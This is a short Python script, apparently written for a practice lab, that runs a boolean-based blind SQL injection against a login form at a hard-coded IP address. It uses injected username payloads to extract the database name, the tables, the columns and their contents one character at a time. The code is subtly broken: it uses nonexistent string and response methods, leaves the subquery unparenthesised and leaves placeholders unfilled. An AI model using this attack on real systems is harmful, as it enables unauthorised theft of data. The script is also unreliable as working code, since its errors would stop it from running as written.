"""
登录框可以进行注入，但只显示True / Fasle
通过真假来逐个爆破内容
admin' and length(database())>=8 #
admin' and length(database())<8 #

"""

import requests
import time

target_url = "http://49.235.141.207:25501/test_sql/bool_login/"
# payload依次填充sql，offset，爆破字符
payload = "admin' and substr({},{},1)='{}'"

sql_get_database = "SELECT database()"
sql_get_table = "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"
# 填充要查询的表名
sql_get_columns = "SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='{}'"
# 填充列名，表名
sql_get_content = "select group_concat({},0x3a,{},0x3a,{}) from {}"

sqli_list = [sql_get_database, sql_get_table, sql_get_columns, sql_get_content]

res = ""
for sql in sqli_list:
    for offset in range(1, 100):
        for chr_ascii in range(0,128):
            form_data_payload = payload.format(sql, offset, chr(chr_ascii))
            form_data = {'username':form_data_payload,'password':'1'}
            response = requests.post(target_url, form_data)
            html = response.text()
            if html.contains("login success!"):
                res+=chr(chr_ascii)
                break